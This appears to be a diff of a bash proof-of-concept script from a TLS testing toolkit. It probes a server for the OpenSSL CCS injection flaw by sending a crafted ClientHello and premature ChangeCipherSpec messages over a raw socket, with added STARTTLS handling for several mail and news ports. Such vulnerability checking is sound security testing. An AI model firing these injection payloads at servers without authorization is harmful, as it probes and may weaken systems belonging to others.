@@ -10,36 +10,42 @@
 #
 ###### DON'T DO EVIL! USAGE AT YOUR OWN RISK. DON'T VIOLATE LAWS! #######
 
-NODE=""
+readonly PS4='${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
+trap "cleanup" QUIT EXIT
+
+[ -z "$1" ] && exit 1
+
+NODE="$1"
+PORT="443"
 SLEEP=2
+MAXSLEEP=10
+OCKREPLY=""
+COL_WIDTH=32
 DEBUG=${DEBUG:-0}
 
-[ -z "$1" ] && exit 1  # host
-
-TLSV=${2:-x01}
+TLSV=${2:-01}
 # TLS 1.0=x01  1.1=0x02, 1.2=0x3
 # the PoC contains per default only check for TLS1.0 as the is the least common denominator
 
-ccs_message="\x14\x03\tls_version\x00\x01\x01"
-##                                                   ^^^^^^^ this is the thing!
+ccs_message="\x14\x03\x$TLSV\x00\x01\x01"
 
 client_hello="
 # TLS header ( 5 bytes)
 ,x16,               # Content type (x16 for handshake)
-x03, tls_version,   # TLS Version
+x03, x$TLSV,        # TLS Version
 x00, x93,           # Length total
 # Handshake header
 x01,                # Type (x01 for ClientHello)
 x00, x00, x8f,      # Length client hello
-x03, tls_version,   # TLS Version
+x03, x$TLSV,        # TLS Version
 x53, x9c, xb2, xcb, # 4 bytes Unix time  see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
 x4b, x42, xf9, x2d, x0b, xe5, x9c, x21, # 28 bytes random bytes
 xf5, xa3, x89, xca, x7a, xd9, xb4, xab, 
 x3f, xd3, x22, x21, x5e, xc4, x65, x0d, 
 x1e, xce, xed, xc2,
-x00,               # Session ID length
-x00, x68,          # Cipher suites length
-  xc0, x13,        # ciphers come now, here: ECDHE-RSA-AES128-SHA = TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+x00,                # Session ID length
+x00, x68,           # Cipher suites length
+  xc0, x13,         # ciphers come now, here: ECDHE-RSA-AES128-SHA = TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
   xc0, x12,
   xc0, x11,
   xc0, x10,
@@ -93,102 +99,187 @@ x00, x68,          # Cipher suites length
   x00, x01,  # TLS_RSA_WITH_NULL_MD5
   x01, x00"  # compression methods length (1) + Compression method(1)
 
-msg=`echo "$client_hello" | sed -e 's/# .*$//g' -e 's/,/\\\/g' | sed -e 's/ //g' | tr -d '\n'`
+#msg=`echo "$client_hello" | sed -e 's/# .*$//g' -e 's/,/\\\/g' | sed -e 's/ //g' | tr -d '\n'`
+msg=$(echo "$client_hello" | sed -e 's/# .*$//g' -e 's/ //g' | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//; /^$/d' | sed 's/,/\\/g' | tr -d '\n')
 
 
 parse_hn_port() {
-	PORT=443       # unless otherwise auto-determined, see below
-	NODE="$1"
+     # strip "https", supposed it was supplied additionally
+     echo $NODE | grep -q 'https://' && NODE=`echo $NODE | sed -e 's/https\:\/\///' `
 
-	# strip "https", supposed it was supplied additionally
-	echo $NODE | grep -q 'https://' && NODE=`echo $NODE | sed -e 's/https\:\/\///' `
+     # strip trailing urlpath
+     NODE=`echo $NODE | sed -e 's/\/.*$//'`
 
-	# strip trailing urlpath
-	NODE=`echo $NODE | sed -e 's/\/.*$//'`
-
-	# determine port, supposed it was supplied additionally
-	echo $NODE | grep -q ':' && PORT=`echo $NODE | sed 's/^.*\://'` && NODE=`echo $NODE | sed
-	's/\:.*$//'`
+     # determine port, supposed it was supplied additionally
+     echo $NODE | grep -q ':' && PORT=`echo $NODE | sed 's/^.*\://'` && NODE=`echo $NODE | sed 's/\:.*$//'`
+     echo -e "\n===> connecting to $NODE:$PORT\n"
 }
+
+wait_kill(){
+     pid=$1
+     maxsleep=$2
+     while true; do
+          if ! ps $pid >/dev/null ; then
+               return 0  # didn't reach maxsleep yet
+          fi
+          sleep 1
+          maxsleep=$((maxsleep - 1))
+          test $maxsleep -eq 0 && break
+     done # needs to be killed:
+     kill $pid >&2 2>/dev/null
+     wait $pid 2>/dev/null
+     return 3   # killed
+}
+
 
 socksend() {
-	data=`echo $1 | sed 's/tls_version/'"$2"'/g'`
-	echo "\"$data\""
-	echo -en "$data" >&5 || return 1
-	sleep $SLEEP
-	return 0
+     data=`echo $1`
+     echo "\"$data\""
+     echo -en "$data" >&5 &
+     sleep $SLEEP
 }
 
-sockread()
-{
-	reply=`dd bs=$1 count=1 <&5 2>/dev/null`
+sockread() {
+     [[ "x$2" == "x" ]] && maxsleep=$MAXSLEEP || maxsleep=$2
+     ret=0
+
+     ddreply=$(mktemp /tmp/ddreply.XXXXXX) || return 7
+     dd bs=$1 of=$ddreply count=1 <&5 2>/dev/null &
+     wait_kill $! $maxsleep
+     ret=$?
+     SOCKREPLY=$(cat $ddreply)
+     rm $ddreply
+
+     return $ret
 }
 
-ok_ids(){
-	echo
-	tput bold; tput setaf 2; echo "ok -- something resetted our ccs packets"; tput sgr0
-	echo
-	exit 0
+# arg1: string to send
+# arg2: success string, yet to be parsed
+starttls_line0() {
+     echo "$1" >&5
+     cat <&5 &
+     wait_kill $! $SLEEP
+     #[ $? -eq 3 ] && fixme "STARTTLS timed out" && exit 1
+}
+
+
+ok_ids() {
+     echo
+     tput bold; tput setaf 2; echo "ok -- something resetted our ccs packets"; tput sgr0
+     echo
+     exit 0
+}
+
+fd_socket(){
+     if ! exec 5<> /dev/tcp/$NODE/$PORT; then
+          echo "`basename $0`: unable to connect to $NODE:$PORT"
+          exit 2
+     fi
+
+     case "$1" in # port
+          21)  # https://tools.ietf.org/html/rfc4217
+               starttls_line0 "FEAT"
+               starttls_line0 "AUTH TLS"
+               ;;
+          25)  #https://tools.ietf.org/html/rfc4217
+               starttls_line0 "EHLO testssl.sh" "250"
+               starttls_line0 "STARTTLS" "220"
+               ;;
+          110) # https://tools.ietf.org/html/rfc2595
+               starttls_line0 "STLS" "OK"
+               ;;
+          119|433) # https://tools.ietf.org/html/rfc4642
+               starttls_line0 "CAPABILITIES" "101"
+               starttls_line0 "STARTTLS" "382"
+               ;;
+          143) # https://tools.ietf.org/html/rfc2595 
+               starttls_line0 "a001 CAPABILITY" "OK"
+               starttls_line0 "a002 STARTTLS" "OK"
+               ;;
+          389) # https://tools.ietf.org/html/rfc2830, https://tools.ietf.org/html/rfc4511
+               fixme "LDAP: FIXME not yet implemented"
+               exit 1
+               ;;
+          674) # https://tools.ietf.org/html/rfc2595
+               fixme "ACAP: FIXME not yet implemented"
+               exit 1
+               ;;
+          5222)
+               starttls_line0 "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>" "proceed"
+               fixme "XMPP: FIXME not yet implemented"
+               ;;
+          443|995|993|465|*)  # we don't need a special command here
+               ;;
+     esac
+     echo
+}
+
+close_socket(){
+     exec 5<&-
+     exec 5>&-
+     return 0
+}
+
+cleanup() {
+     close_socket
 }
 
 
 #### main
 
-parse_hn_port "$1"
-
-if ! exec 5<> /dev/tcp/$NODE/$PORT; then
-	echo "`basename $0`: unable to connect to $NODE:$PORT"
-	exit 2
-fi
-# socket is now open with fd 5
+parse_hn_port 
+fd_socket $PORT
 
 
-echo "##### sending client hello:"
+echo "##### sending standard client hello with TLS version 03,$TLSV:"
 socksend "$msg" $TLSV
 sleep 1
 
-sockread 10000
-echo -e "\n##### server hello\c"
+sockread 16384
+echo "##### reading server hello:"
 if test $DEBUG ; then
-	echo ":"
-	echo -e "$reply" | xxd -c32 | head -20
-	echo "[...]"
-	echo
+     echo "$SOCKREPLY" | xxd -c$COL_WIDTH | head -10
+     echo "[...]"
+     echo
+fi
+if [ 1 -ge $(echo "$SOCKREPLY" | xxd | wc -l) ]; then
+     tput bold; tput setaf 5; echo "TLS handshake failed"; tput sgr0
+     exit 1
 fi
 
-echo "##### sending ccs injection with TLS version $TLSV:"
+
+echo "##### sending ccs injection payload with TLS version 03,$TLSV (1)"
 socksend "$ccs_message" $TLSV || ok_ids
 sleep 1
+echo "##### sending ccs injection payload with TLS version 03,$TLSV (2)"
 socksend "$ccs_message" $TLSV || ok_ids
 sleep 1
 
 sockread 65534
 echo
 echo "###### reply: "
-echo -e "$reply" | xxd -c32
+echo "============================="
+echo "$SOCKREPLY" | xxd -c$COL_WIDTH | head -20
+echo "============================="
 echo
 
-reply_sanitized=`echo -e "$reply" | xxd -p | tr -cd '[:print:]' | sed 's/^..........//'`
+reply_sanitized=$(echo -e "$SOCKREPLY" | xxd -p | tr -cd '[:print:]' | sed 's/^..........//')
 test $DEBUG || echo $reply_sanitized 
 
-lines=`echo -e "$reply" | xxd -c32 | wc -l`
+lines=$(echo -e "$SOCKREPLY" | xxd -c32 | wc -l)
 test $DEBUG || echo $lines
 
 if [ "$lines" -gt 1 ] || [ "$reply_sanitized" == "0a" ] ;then
-	tput bold; tput setaf 2; echo "ok"; tput sgr0
-	ret=0
+     tput bold; tput setaf 2; echo "ok"; tput sgr0
+     ret=0
 else
-	tput bold; tput setaf 1; echo "VULNERABLE"; tput sgr0
-	ret=1
+     tput bold; tput setaf 1; echo "VULNERABLE"; tput sgr0
+     ret=1
 fi
 
-# closing fd:
-exec 5<&-
-exec 5>&-
 
 echo
 exit $ret
 
-
-#  vim:tw=100:ts=5:sw=5
-#  $Id: ccs-injection.sh,v 1.5 2014/11/03 20:45:47 dirkw Exp $ 
+#  vim:tw=100:ts=5:sw=5:expandtab
+#  $Id: ccs-injection.bash,v 1.7 2015/07/01 17:48:00 dirkw Exp $ 
